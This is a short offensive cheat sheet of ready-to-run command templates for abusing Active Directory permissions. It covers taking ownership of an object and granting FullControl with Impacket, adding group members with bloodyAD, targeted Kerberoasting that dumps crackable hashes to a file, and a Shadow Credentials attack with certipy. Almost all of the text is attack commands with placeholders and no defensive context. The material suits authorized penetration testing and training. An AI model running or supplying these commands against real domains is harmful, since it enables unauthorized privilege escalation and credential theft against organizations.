# acl

% ACL, Impacket, BloodyAD

## WriteOwner - Impacket
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/PRIVILEGE-ESCALATION

```bash
DOMAIN=<Domain>
NEW_OWNER=<New_Owner_Username>
USER=<Username>
PASSWORD=<Password>
VICTIM=<Victim_Username>
owneredit.py "$DOMAIN"/"$USER":"$PASSWORD" -action write -target "$VICTIM" -new-owner "$NEW_OWNER"
dacledit.py -action 'write' -rights 'FullControl' -principal "$NEW_OWNER" -target "$VICTIM" "$DOMAIN"/"$USER":"$PASSWORD"
unset DOMAIN NEW_OWNER USER PASSWORD VICTIM
```

## add group Member - AddSelf/GenericAll - BloodyAD
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/PRIVILEGE-ESCALATION
AddSelf/GenericAll to a group

```bash
bloodyAD --host <IP> -u <Username> -p <Password> add groupMember <Group> <Member>
```

## WriteSPN - Targeted Kerberoast
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/KERBEROASTING

Note:

When using kerberos authentication, make sure you export the KRB5CCNAME environment variable pointing to your valid Kerberos ticket cache file.

And empty the password field.


```bash
targetedKerberoast.py -v -d <Domain> --dc-host <DC_Host> -u <Username> <Creds_Options|-p|-k --no-pass> <Password> -o targeted_kerberoast_hashes.txt
```

## Shadow Credentials Attack
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/PRIVILEGE-ESCALATION

```bash
certipy shadow auto -target <IP> -u <Username> -p <Password> -account <Target_Username>
```